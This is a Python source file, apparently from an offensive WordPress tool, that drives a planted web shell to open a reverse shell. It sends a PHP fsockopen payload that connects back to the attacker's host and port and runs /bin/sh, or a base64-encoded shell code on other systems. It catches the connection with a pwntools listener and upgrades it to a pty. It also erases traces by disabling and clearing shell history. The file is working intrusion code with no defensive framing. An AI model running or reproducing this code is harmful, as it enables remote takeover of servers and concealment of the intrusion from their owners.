import requests
import base64
from omega_wp.config import SHELL_STABILIZATION_METHODS, SHELL_CODE, DEFAULT_HEADERS
from pwnlib.tubes.listen import listen


class ShellService:
    def __init__(self, web_shell_url: str, lhost: str, lport: int):
        self.web_shell_url = web_shell_url
        self.lhost = lhost
        self.lport = lport

    def prepare_listener(self) -> listen:
        listener = listen(self.lport)

        return listener

    def execute_rev_shell(self):
        try:
            requests.get(self.get_shell_code_url_with_payload(), headers=DEFAULT_HEADERS, timeout=2)
        except requests.exceptions.ReadTimeout:
            pass

    def get_shell_code_url_with_payload(self) -> str:
        if(self.is_linux()):
            shell_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
            payload = requests.utils.quote(f"php -r '{shell_code}'")
            return f'{self.web_shell_url}?omega={payload}'
        else:
            plain_shell_code = SHELL_CODE.replace('LHOST', f'{self.lhost}').replace('LPORT', f'{self.lport}')
            payload = requests.utils.quote(base64.b64encode(plain_shell_code.encode()).decode())
            return f'{self.web_shell_url}?omega={payload}&php'

    def is_linux(self) -> bool:
        os_check_code = requests.utils.quote(base64.b64encode(b"print('OMEGA_HOST_OS = '.PHP_OS);").decode())
        response = requests.get(f'{self.web_shell_url}?omega={os_check_code}&php', headers=DEFAULT_HEADERS)
        return 'OMEGA_HOST_OS = LINUX' in response.content.decode().upper()

    def is_rev_shell(self, shell: listen) -> bool:
        data_received = shell.recv(timeout=0.5)
        shell.unrecv(data_received)

        if (not b'$' in data_received and not b'Windows' in data_received):
            return False
        return True

    def upgrade_shell(self, shell: listen):
        shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
        # Get pty
        shell.sendline(f'{self.find_pty_spawn_vector(shell)}; exit'.encode())

        shell.recv(timeout = None) # Wait for pty to spawn
        shell.sendline(b'export HISTFILE=/dev/null')
        shell.sendline(b'stty rows 38 columns 116')
        shell.sendline(b""" alias ls='ls --color=auto'""")
        shell.sendline(b'export TERM=xterm')
        shell.sendline(b'history -c')
        shell.clean(timeout=1)
    
    def find_pty_spawn_vector(self, shell: listen) -> str:
        shell.clean()

        for binary in SHELL_STABILIZATION_METHODS:
            shell.sendline(f'which {binary}'.encode())
            result = shell.recvline(timeout=2).decode()
            if(binary in result and 'not found' not in result):
                for shell_binary in SHELL_STABILIZATION_METHODS[binary]:
                    shell.sendline(f'which {shell_binary}'.encode())
                    result = shell.recvline(timeout=2).decode()
                    if(shell_binary in result and 'not found' not in result):
                        return SHELL_STABILIZATION_METHODS[binary][shell_binary]
            shell.clean()
        
        raise Exception('No pty spawn vector found')
